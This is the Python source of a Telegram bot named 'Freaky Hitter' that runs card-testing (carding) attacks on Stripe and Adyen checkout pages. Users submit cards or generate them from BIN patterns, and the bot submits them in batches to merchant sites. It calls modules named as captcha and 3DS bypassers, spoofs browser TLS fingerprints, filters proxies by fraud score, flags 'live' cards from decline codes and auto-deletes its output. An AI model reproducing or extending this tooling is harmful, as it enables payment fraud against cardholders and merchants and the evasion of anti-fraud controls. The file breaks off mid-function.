import os
import asyncio
import re
import asyncpg
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import aiohttp
import html
from aiogram.types import FSInputFile

# --- GLOBALLY MONKEYPATCH REQUESTS WITH CURL_CFFI FOR BROWSER TLS FINGERPRINTS ---
import requests
from curl_cffi.requests import Session as CurlSession
from curl_cffi.requests import post as curl_post
from curl_cffi.requests import get as curl_get
from curl_cffi.requests import request as curl_request

def get_impersonate_target(headers):
    if not headers:
        return 'chrome120'
    ua = ""
    for k, v in headers.items():
        if k.lower() == 'user-agent':
            ua = str(v)
            break
    if not ua:
        return 'chrome120'
    ua_lower = ua.lower()
    if 'android' in ua_lower:
        return 'chrome_android'
    elif 'iphone' in ua_lower or 'ipad' in ua_lower:
        return 'safari_ios'
    elif 'firefox' in ua_lower:
        return 'firefox120'
    elif 'safari' in ua_lower and 'chrome' not in ua_lower:
        return 'safari17'
    return 'chrome120'

class ImpersonatedSession(CurlSession):
    def __init__(self, *args, **kwargs):
        kwargs.setdefault('impersonate', 'chrome120')
        super().__init__(*args, **kwargs)
        
    def request(self, method, url, *args, **kwargs):
        target = get_impersonate_target(kwargs.get('headers') or self.headers)
        kwargs.setdefault('impersonate', target)
        return super().request(method, url, *args, **kwargs)

requests.Session = ImpersonatedSession

def wrapped_post(url, data=None, json=None, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_post(url, data=data, json=json, **kwargs)

def wrapped_get(url, params=None, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_get(url, params=params, **kwargs)

def wrapped_request(method, url, **kwargs):
    target = get_impersonate_target(kwargs.get('headers'))
    kwargs.setdefault('impersonate', target)
    return curl_request(method, url, **kwargs)

requests.post = wrapped_post
requests.get = wrapped_get
requests.request = wrapped_request
# ---------------------------------------------------------------------------------

from hitter_core import CardGenerator, ConcurrentHitter, STRIPE_DECLINE_CODES, ProxyManager


load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN") or os.getenv("BOT_TOKEN")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID")
OWNER_ID = os.getenv("OWNER_ID")

# Setup bot
dp = Dispatcher()
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

# Global store for active sessions
active_sessions = {}
db_pool = None
approved_users_set = set()

@dp.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚡ Commands Menu ⚡", callback_data="show_commands")]
    ])
    
    welcome_text = (
        "🩸 <b>Welcome to Freaky Hitter</b> 🩸\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<i>I've been waiting for you...</i>\n\n"
        "Tell me what we're breaking today. No checkout is safe, no proxy is fast enough, and I won't stop until it bleeds green.\n\n"
        "Feed me the cards. Let the obsession begin.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👉 Use <code>/cmds</code> or click below to unlock my secrets."
    )
    await message.answer(welcome_text, reply_markup=markup)

@dp.message(Command("cmds"))
async def cmds_command(message: types.Message) -> None:
    commands_text = (
        "⚡ <b>FREAKY HITTER COMMANDS</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💳 <b>/hit</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
        "└ <i>Hits 1 to 10 cards against Stripe checkout.</i>\n\n"
        "💎 <b>/hitad</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
        "└ <i>Hits 1 to 10 cards against Adyen gateway checkout.</i>\n\n"
        "🎲 <b>/hit</b> <code>[url] [bin_pattern] [count]</code>\n"
        "└ <i>Generates BIN cards and hits concurrently.</i>\n\n"
        "🌐 <b>/proxy</b> <code>[ip:port:user:pass]</code>\n"
        "└ <i>Imports and validates new proxy pool.</i>\n\n"
        "🧹 <b>/proxy</b>\n"
        "└ <i>Runs self-check and purges dead IPs.</i>\n\n"
        "📊 <b>/proxystatus</b>\n"
        "└ <i>Displays active working proxy count.</i>\n\n"
        "🔌 <b>/offproxy</b>\n"
        "└ <i>Clears proxy pool & uses direct IP.</i>\n\n"
        "🛑 <b>/stop</b>\n"
        "└ <i>Instantly aborts your active session.</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await message.answer(commands_text)

@dp.message(Command("approve"))
async def approve_command(message: types.Message):
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        await message.answer("<b>Error</b>\n<code>Unauthorized command. Only the owner can use /approve.</code>")
        return

    args = message.text.split(" ")
    if len(args) < 2:
        await message.answer("<b>Error</b>\n<code>Usage: /approve [userid]</code>")
        return

    target_id_str = args[1].strip()
    if not target_id_str.isdigit():
        await message.answer("<b>Error</b>\n<code>Invalid User ID. Must be numeric.</code>")
        return

    target_id = int(target_id_str)
    approved_users_set.add(target_id)

    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO approved_users (user_id)
                    VALUES ($1)
                    ON CONFLICT (user_id) DO NOTHING
                """, target_id)
        except Exception as e:
            print(f"Failed to save approved status: {e}")

    await message.answer(f"✅ <b>Approved</b>\n<code>User ID {target_id} has been approved. Hitting output messages will not be auto-deleted.</code>")
    
    try:
        await bot.send_message(target_id, "🎉 <b>You've been approved by the owner!</b> Your transaction messages will no longer be auto-deleted. ⚡")
    except Exception as e:
        print(f"Failed to send peer notification to approved user: {e}")

def extract_clean_site_domain(merchant: str, url_str: str) -> str:
    """Extracts clean site domain e.g. www.openart.ai or manus.ai."""
    if not url_str:
        return ""
    if not url_str.startswith("http://") and not url_str.startswith("https://"):
        url_str = "https://" + url_str
    try:
        domain = urllib.parse.urlparse(url_str).netloc.split(":")[0]
        # If domain is a gateway checkout domain (stripe checkout / adyen link), infer domain from merchant name
        if domain in ('checkout.stripe.com', 'invoice.stripe.com', 'pay.stripe.com', 'eu.adyen.link', 'adyen.link', 'test.adyen.link'):
            clean_m = re.sub(r'[^\w\s]', '', merchant or '').strip().lower().replace(' ', '')
            if clean_m and clean_m not in ('unknown', 'stripemerchant', 'adyenmerchant'):
                return f"www.{clean_m}.com" if not clean_m.endswith('.com') else clean_m
            return domain
        return domain
    except Exception:
        return ""

def extract_success_url_line(res: dict) -> str:
    """Extracts final/success/receipt/confirmation URL line on successful payment."""
    if not res.get('success'):
        return ""
    success_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
    if success_url:
        escaped_url = html.escape(str(success_url))
        return f"\n🔗 <b>Success URL:</b> {escaped_url}"
    return ""

def is_session_expired_err(res: dict) -> bool:
    """Check if response indicates a single-use / pay by link session exhaustion."""
    reason = str(res.get('error') or res.get('decline_code') or '').lower()
    return any(k in reason for k in ['exhausted', 'session_expired', 'link_expired', 'single-use', 'already_paid', 'session_complete', 'pay by link exhausted'])

def parse_cards_input(payload_tokens: list, raw_payload: str):
    """
    Parses cards from user payload.
    Supports:
    1. Single or Multiple CCs (up to 10): /hit [url] [cc1] [cc2] ... [cc10]
    2. BIN generation: /hit [url] [bin_pattern] [count=10] (defaults to 10 if count omitted)
    """
    cards = []

    # 1. Direct card regex matching
    matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
    if matches:
        for m in matches:
            cards.append({
                'card': m[0],
                'month': m[1].zfill(2),
                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
                'cvv': m[3]
            })
        if len(cards) > 10:
            return None, f"Submission of {len(cards)} cards rejected. Max concurrent limit is 10."
        return cards, None

    # 2. Check for BIN pattern (with or without count)
    if payload_tokens:
        count_val = payload_tokens[-1]
        count = 10  # Default count to 10 if not specified
        potential_bin = ""

        if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
            count = int(count_val)
            potential_bin = "".join(payload_tokens[:-1]).strip()
        else:
            potential_bin = "".join(payload_tokens).strip()

        clean_bin = potential_bin.lower().replace(' ', '')
        if 'x' in clean_bin or (clean_bin.isdigit() and len(clean_bin) >= 6):
            if count > 10:
                return None, "Maximum batch limit is 10 concurrent requests."
            for _ in range(count):
                card = CardGenerator.generate(potential_bin)
                if card:
                    cards.append(card)
            if not cards:
                return None, "BIN pattern generation failed."
            return cards, None

    # 3. Single card fallback
    clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
    clean_cc = clean_cc.replace('/', '|')
    cc_parts = [p for p in clean_cc.split('|') if p]
    if len(cc_parts) == 4:
        cards.append({
            'card': cc_parts[0],
            'month': cc_parts[1].zfill(2),
            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
            'cvv': cc_parts[3]
        })
        return cards, None

    return None, "Invalid card formatting. Expected: <code>card|mm|yy|cvv</code> or <code>[bin_pattern] [count=10]</code>"


@dp.message(Command("hit"))
async def hit_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    # Naked IP Block
    if not await ProxyManager.has_proxies(user_id):
        await message.answer("<b>Error</b>\n<code>Proxy pool is empty. Please set a proxy first: /proxy ip:port:user:pass</code>")
        return

    raw_tokens = message.text.strip().split()
    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hit [url] [bin_pattern] [count=10]</code>")
        return
        
    url = raw_tokens[1]
    payload_tokens = raw_tokens[2:]
    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
    
    cards, err = parse_cards_input(payload_tokens, raw_payload)
    if err:
        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
        return
        
    status_msg = await message.answer("cooking....")
    
    card_blocks = []
    merchant_name = "Stripe Merchant"
    amount_str = None
    
    # Callback to update the Telegram message
    async def update_status(data):
        nonlocal merchant_name, amount_str
            
        if data["status"] == "analyzing":
            try: await status_msg.edit_text("cooking....")
            except Exception: pass
        elif data["status"] == "starting":
            info = data.get("url_info", {})
            merchant_name = info.get("merchant") or merchant_name
            raw_amt = info.get("amount")
            if isinstance(raw_amt, int) or (isinstance(raw_amt, str) and raw_amt.isdigit()):
                amount_str = f"USD {int(raw_amt)/100:.2f}"
            elif raw_amt:
                amount_str = str(raw_amt)
            
            site_domain = extract_clean_site_domain(merchant_name, url)
            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
            amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
            msg_text = f"<b>Stripe Checkout Hitter</b>\n\n<i>cooking....</i>\n\n{site_line}{amt_line}"
            if len(cards) > 1:
                try: await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception: pass
            
        elif data["status"] == "progress":
            res = data["result"]
            
            # Attempt Stripe Captcha Bypass if hCaptcha / rqdata detected
            from stripe_captcha_bypasser import StripeCaptchaBypasser
            if not res.get('success') and StripeCaptchaBypasser.is_captcha_triggered(res):
                try:
                    px_data = await ProxyManager.get_random(user_id)
                    res = await StripeCaptchaBypasser.bypass_captcha(res, proxy_data=px_data)
                except Exception:
                    pass

            # Attempt Stripe 3DS Auto-Bypass if 3DS / authentication_required detected
            if not res.get('success') and (res.get('decline_code') in ('authentication_required', '3d_secure', 'challenge_required') or res.get('status') == 'requires_action' or (isinstance(res.get('raw_response'), dict) and res.get('raw_response', {}).get('status') == 'requires_action')):
                try:
                    from stripe_3ds_bypasser import Stripe3DSBypasser
                    px_data = await ProxyManager.get_random(user_id)
                    res = await Stripe3DSBypasser.resolve_3ds(res, proxy_data=px_data)
                except Exception:
                    pass

            card_obj = res.get('card', {})
            card_str = f"{card_obj.get('card')}|{card_obj.get('month')}|{card_obj.get('year')}|{card_obj.get('cvv')}"
            
            amt = res.get('amount')
            if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
                amount_str = f"USD {int(amt)/100:.2f}"
            elif amt:
                amount_str = str(amt)
                
            merchant_name = res.get('merchant') or merchant_name
            site_domain = extract_clean_site_domain(merchant_name, url)
            is_approved = user_id in approved_users_set

            if len(cards) == 1:
                if status_msg:
                    try: await status_msg.delete()
                    except: pass

                merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
                amt_val = amount_str or "USD 0.00"

                if res['success']:
                    tds_line = "\n🔓 3DS: <b>BYPASSED [STRIPE]</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
                    cpt_line = "\n🤖 Captcha: <b>BYPASSED [STRIPE]</b>" if res.get('captcha_bypassed') else ""
                    succ_url_line = extract_success_url_line(res)
                    hit_text = (
                        f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
                        f"💳 <code>{card_str}</code>\n"
                        f"💰 Amount: {amt_val}\n"
                        f"🛒 Merchant: {merchant_disp}\n"
                        f"⏱ {res['response_time']:.2f}s"
                        f"{tds_line}"
                        f"{cpt_line}"
                        f"{succ_url_line}" + note_line
                    )
                else:
                    code_raw = str(res.get('decline_code') or res.get('error') or 'unknown').lower()
                    live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded', 'card_velocity_exceeded', 'authentication_required', 'challenge_required', '3d_secure']
                    is_live = any(c in code_raw for c in live_codes)
                    status_title = "🟢 <b>CARD LIVE [STRIPE]</b>" if is_live else "❌ <b>PAYMENT UNSUCCESSFUL</b>"
                    
                    err_str = str(res.get('error') or '').strip()
                    decline_code = str(res.get('decline_code') or '').strip()
                    if 'raw:' in err_str or '{"' in err_str or 'rqdata_captcha' in err_str:
                        reason_msg = html.escape(decline_code.lower()) if decline_code and decline_code not in ('unknown', 'exception') else "stripe_captcha_bypass_failed"
                    elif decline_code and decline_code not in ('unknown', 'exception', 'declined', 'failed'):
                        reason_msg = html.escape(decline_code.lower())
                    elif err_str:
                        reason_msg = html.escape(err_str[:150])
                    else:
                        reason_msg = "card_declined"

                    hit_text = (
                        f"{status_title}\n"
                        f"💳 <code>{card_str}</code>\n"
                        f"💰 Amount: {amt_val}\n"
                        f"🛒 Merchant: {merchant_disp}\n"
                        f"📉 Reason: {reason_msg}\n"
                        f"⏱ {res['response_time']:.2f}s" + note_line
                    )

                sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
                if not is_approved:
                    async def auto_del_single(m):
                        await asyncio.sleep(30)
                        try: await m.delete()
                        except: pass
                    asyncio.create_task(auto_del_single(sent_msg))
            else:
                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
                
                if res['success']:
                    resp_str = "Succeeded"
                    if res.get('3ds_bypassed'):
                        resp_str += " (3DS Bypassed)"
                    elif res.get('captcha_bypassed'):
                        resp_str += " (Captcha Bypassed)"
                else:
                    resp_str = res.get('error') or res.get('decline_code') or "Card declined"

                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(str(resp_str))}"
                succ_url_line = extract_success_url_line(res)
                if succ_url_line:
                    block += succ_url_line
                if is_session_expired_err(res):
                    block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"

                card_blocks.append(block)

                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                blocks_text = "\n\n".join(card_blocks)

                msg_text = (
                    f"<b>Stripe Checkout Hitter</b>\n\n"
                    f"{blocks_text}\n\n"
                    f"{site_line}"
                    f"{amt_line}"
                )

                try:
                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception:
                    pass
                
        elif data["status"] in ("completed", "error"):
            is_approved = user_id in approved_users_set
            if not is_approved and status_msg and len(cards) > 1:
                async def auto_del_stripe(m):
                    await asyncio.sleep(30)
                    try: await m.delete()
                    except: pass
                asyncio.create_task(auto_del_stripe(status_msg))
            if user_id in active_sessions:
                del active_sessions[user_id]

    hitter = ConcurrentHitter(user_id, url, cards, update_callback=update_status)
    active_sessions[user_id] = hitter
    
    async def safe_run():
        try:
            await hitter.run()
        except Exception as ex:
            if status_msg:
                try: await status_msg.delete()
                except: pass
            await message.answer(f"❌ <b>Error processing session:</b>\n<code>{html.escape(str(ex))}</code>")
        finally:
            if user_id in active_sessions:
                del active_sessions[user_id]
                
    asyncio.create_task(safe_run())

@dp.message(Command("hitad"))
async def hitad_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    # Naked IP Block
    if not await ProxyManager.has_proxies(user_id):
        await message.answer("<b>Error</b>\n<code>Proxy pool is empty. Please set a proxy first: /proxy ip:port:user:pass</code>")
        return

    raw_tokens = message.text.strip().split()
    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitad [url] [bin_pattern] [count=10]</code>")
        return
        
    url = raw_tokens[1]
    payload_tokens = raw_tokens[2:]
    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
    
    cards, err = parse_cards_input(payload_tokens, raw_payload)
    if err:
        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
        return

    status_msg = await message.answer("cooking....")
    active_sessions[user_id] = True
    
    try:
        from adyen_hitter import AdyenHitter
        proxy_data = await ProxyManager.get_random(user_id)
        adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
        
        card_blocks = []
        merchant_name = "Adyen Merchant"
        amount_str = None
        results = []

        for idx, card in enumerate(cards, 1):
            if user_id not in active_sessions:
                break
            res = await adyen_engine.hit(card, idx, user_id)
            results.append(res)
            
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            merchant_name = res.get('merchant') or merchant_name
            if res.get('amount'):
                amount_str = res['amount']

            site_domain = extract_clean_site_domain(merchant_name, url)

            if len(cards) > 1:
                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
                
                if res['success']:
                    resp_str = "Authorised"
                    if res.get('3ds_resolved') or res.get('3ds_bypassed'):
                        resp_str += " (3DS Bypassed)"
                else:
                    resp_str = res.get('error') or res.get('decline_code') or "Refused"

                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
                succ_url_line = extract_success_url_line(res)
                if succ_url_line:
                    block += succ_url_line
                
                expired = is_session_expired_err(res)
                if expired:
                    block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"

                card_blocks.append(block)

                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                blocks_text = "\n\n".join(card_blocks)

                msg_text = (
                    f"<b>Adyen Checkout Hitter</b>\n\n"
                    f"{blocks_text}\n\n"
                    f"{site_line}"
                    f"{amt_line}"
                )

                try:
                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception:
                    pass

                if expired:
                    break

        is_approved = user_id in approved_users_set

        if len(cards) == 1 and results:
            if status_msg:
                try: await status_msg.delete()
                except: pass

            res = results[0]
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            merchant_name = res.get('merchant') or merchant_name
            amount_val = res.get('amount') or amount_str or "USD 0.00"
            site_domain = extract_clean_site_domain(merchant_name, url)
            merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
            note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"

            if res.get('success'):
                succ_url_line = extract_success_url_line(res)
                hit_text = (
                    f"✅ <b>PAYMENT SUCCESSFUL [ADYEN]</b>\n"
                    f"💳 <code>{card_str}</code>\n"
                    f"💰 Amount: {amount_val}\n"
                    f"🛒 Merchant: {merchant_disp}\n"
                    f"⏱ {res.get('response_time', 0):.2f}s"
                    f"{succ_url_line}" + note_line
                )
            else:
                reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
                hit_text = (
                    f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n"
                    f"💳 <code>{card_str}</code>\n"
                    f"💰 Amount: {amount_val}\n"
                    f"🛒 Merchant: {merchant_disp}\n"
                    f"📉 Reason: {reason_msg}\n"
                    f"⏱ {res.get('response_time', 0):.2f}s" + note_line
                )

            sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
            if not is_approved:
                async def auto_del_ad(m):
                    await asyncio.sleep(30)
                    try: await m.delete()
                    except: pass
                asyncio.create_task(auto_del_ad(sent_msg))
        elif len(cards) > 1 and not is_approved and status_msg:
            async def auto_del_ad(m):
                await asyncio.sleep(30)
                try: await m.delete()
                except: pass
            asyncio.create_task(auto_del_ad(status_msg))

    except Exception as ex:
        if status_msg:
            try: await status_msg.delete()
            except: pass
        await message.answer(f"❌ <b>Error processing Adyen check:</b>\n<code>{html.escape(str(ex))}</code>")
    finally:
        if user_id in active_sessions:
            del active_sessions[user_id]

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_sessions:
        hitter = active_sessions[user_id]
        hitter.is_running = False
        del active_sessions[user_id]
        await message.answer("<b>Status</b>\n<code>Session termination requested. Pending final queue execution.</code>")
    else:
        await message.answer("<b>Status</b>\n<code>No active sessions found.</code>")




@dp.message(Command("setlog"))
async def setlog_command(message: types.Message):
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        await message.answer("<b>Error</b>\n<code>Unauthorized command. Only the owner can use /setlog.</code>")
        return
    global LOG_GROUP_ID
    LOG_GROUP_ID = str(message.chat.id)
    with open(".env", "a") as f:
        f.write(f"\nLOG_GROUP_ID={LOG_GROUP_ID}")
    await message.answer(f"✅ Log group set permanently! (ID: {LOG_GROUP_ID})\nAll successes and proxies will be forwarded here.")

@dp.message(Command("proxystatus"))
async def proxystatus_command(message: types.Message):
    count = await ProxyManager.get_count(message.from_user.id)
    if count == 0:
        await message.answer("<b>Proxy Status</b>\n<code>Pool is empty.</code>")
    else:
        await message.answer(f"<b>Proxy Status</b>\n<code>Active pool count: {count}</code>")

@dp.message(Command("offproxy"))
async def offproxy_command(message: types.Message):
    await ProxyManager.clear(message.from_user.id)
    await message.answer("<b>Proxy Status</b>\n<code>Pool cleared. Direct server routing active.</code>")

async def test_proxy_single(p, is_pool, user_id):
    proxy_url = p['server']
    if 'username' in p:
        server = p['server'].replace('http://', '')
        proxy_url = f"http://{p['username']}:{p['password']}@{server}"
        
    try:
        async with aiohttp.ClientSession() as session:
            # First, test connection
            async with session.get("https://checkout.stripe.com/", proxy=proxy_url, timeout=10) as resp:
                if resp.status in [200, 404]:
                    # Next, check IP quality and Fraud Score using proxycheck.io
                    is_weak = False
                    try:
                        # We need to get the proxy's public IP first since proxycheck.io sometimes requires the IP in the URL
                        proxy_ip = None
                        async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, timeout=5) as ipify_resp:
                            if ipify_resp.status == 200:
                                ipify_data = await ipify_resp.json()
                                proxy_ip = ipify_data.get("ip")
                                
                        if proxy_ip:
                            async with session.get(f"http://proxycheck.io/v2/{proxy_ip}?vpn=1&asn=1&risk=1", proxy=proxy_url, timeout=5) as ip_resp:
                                if ip_resp.status == 200:
                                    ip_data = await ip_resp.json()
                                    if ip_data.get("status") == "ok":
                                        for key, val in ip_data.items():
                                            if key not in ["status", "node", "query_time", "message"]:
                                                ip_type = str(val.get("type", "Unknown"))
                                                risk = val.get("risk", 0)
                                                
                                                if "Datacenter" in ip_type or "VPN" in ip_type or "Business" in ip_type or risk > 33:
                                                    is_weak = True
                                                break
                    except Exception:
                        pass
                        
                    return True, False, is_weak, p['raw']
                else:
                    return False, True, False, p['raw']
    except:
        return False, True, False, p['raw']

async def test_proxy_list(proxies_to_test, is_pool, user_id):
    live_proxies = []
    dead_proxies = []
    weak_proxies = []
    
    tasks = [test_proxy_single(p, is_pool, user_id) for p in proxies_to_test]
    completed = await asyncio.gather(*tasks)
    
    for success, is_dead, is_weak, raw in completed:
        if success:
            live_proxies.append(raw)
            if is_weak:
                weak_proxies.append(raw)
        if is_dead:
            dead_proxies.append(raw)
            if is_pool:
                await ProxyManager.remove(user_id, raw)
                
    return live_proxies, dead_proxies, weak_proxies

@dp.message(Command("allproxies"))
async def allproxies_command(message: types.Message):
    if not message.from_user:
        return
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        return
        
    db_pool = ProxyManager.db_pool
    if not db_pool:
        await message.answer("📁 <b>Database connection not active.</b>")
        return
        
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT user_id, proxies FROM user_proxies")
        proxies_map = {}
        for row in rows:
            if row['proxies']:
                import json
                proxies_map[row['user_id']] = json.loads(row['proxies'])
        
    lines = []
    lines.append("📁 <b>All Loaded Proxies:</b>\n")
    for u_id, proxies in proxies_map.items():
        lines.append(f"👤 <b>User ID:</b> <code>{u_id}</code> (Total: {len(proxies)})")
        for p in proxies:
            raw_p = p.get('raw') or p.get('server')
            lines.append(f"  • <code>{raw_p}</code>")
        lines.append("")
        
    output_text = "\n".join(lines)
    
    if len(output_text) > 3500:
        temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
        os.makedirs(temp_dir, exist_ok=True)
        temp_file_path = os.path.join(temp_dir, 'all_proxies.txt')
        
        clean_lines = []
        for u_id, proxies in proxies_map.items():
            clean_lines.append(f"User ID: {u_id} (Total: {len(proxies)})")
            for p in proxies:
                raw_p = p.get('raw') or p.get('server')
                clean_lines.append(f"  - {raw_p}")
            clean_lines.append("")
            
        with open(temp_file_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(clean_lines))
            
        await message.reply_document(
            document=FSInputFile(temp_file_path, filename="all_proxies.txt"),
            caption=f"📁 All proxies list (Total users: {len(proxies_map)})"
        )
        try:
            os.remove(temp_file_path)
        except Exception:
            pass
    else:
        await message.answer(output_text)

@dp.message(Command("proxy", "setproxy", "chkproxy"))
async def proxy_command(message: types.Message):
    user_id = message.from_user.id
    
    # Parse command arguments
    command_parts = message.text.split(maxsplit=1)
    text = command_parts[1].strip() if len(command_parts) > 1 else ""
    
    is_loading_new = bool(text)
    proxies_to_test = []
    
    if is_loading_new:
        temp_pool = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if not line: continue
            
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"):
                prefix = "socks5://"
                line = line[9:]
            elif line.lower().startswith("http://"):
                prefix = "http://"
                line = line[7:]
                
            parts = line.split(':')
            if len(parts) == 4:
                temp_pool.append({"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                temp_pool.append({"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"})
        proxies_to_test = temp_pool
    else:
        proxies_to_test = list(await ProxyManager.get_user_proxies(user_id))
        
    if not proxies_to_test:
        if is_loading_new:
            await message.answer("<b>Error</b>\n<code>Failed to parse proxies. Expected format: ip:port or ip:port:user:pass</code>")
        else:
            await message.answer("<b>Error</b>\n<code>Proxy pool is empty. Set proxies via command: /proxy ip:port:user:pass</code>")
        return

    loading_status = "verifying_channels" if is_loading_new else "running_self_check"
    status_msg = await message.answer(
        f"⏳ <b>Checking proxies...</b>\n"
        f"<code>Testing {len(proxies_to_test)} proxy channels in background</code>"
    )
    
    # Test proxies
    live_proxies, dead_proxies, weak_proxies = await test_proxy_list(proxies_to_test, not is_loading_new, user_id)
    
    live_count = len(live_proxies)
    dead_count = len(dead_proxies)
    weak_count = len(weak_proxies)
    premium_count = live_count - weak_count
    total_tested = len(proxies_to_test)
    
    # Calculate health score percentage
    health_pct = int((live_count / total_tested) * 100) if total_tested > 0 else 0
    
    final_msg = (
        f"🟢 <b>ACTIVE PROXIES ({health_pct}%)</b>\n\n"
        f"<code>LIVE   :: {live_count} / {total_tested}</code>\n"
        f"<code>DEAD   :: {dead_count}</code>"
    )
    
    if is_loading_new:
        if live_count == 0:
            final_msg += "<code>⚠️ ERROR :: All imported proxies failed connection tests</code>"
            await status_msg.edit_text(final_msg)
            return
            
        # Cache results in memory
        if not hasattr(bot, 'pasted_proxies_cache'):
            bot.pasted_proxies_cache = {}
        
        premium_raws = [p for p in live_proxies if p not in weak_proxies]
        bot.pasted_proxies_cache[user_id] = {
            'premium': premium_raws,
            'live': live_proxies
        }
        
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        buttons = []
        if len(premium_raws) > 0:
            buttons.append([InlineKeyboardButton(text=f"Add Premium Only ({len(premium_raws)})", callback_data="add_strong_only")])
        buttons.append([InlineKeyboardButton(text=f"Add All Live ({live_count})", callback_data="add_live_all")])
        
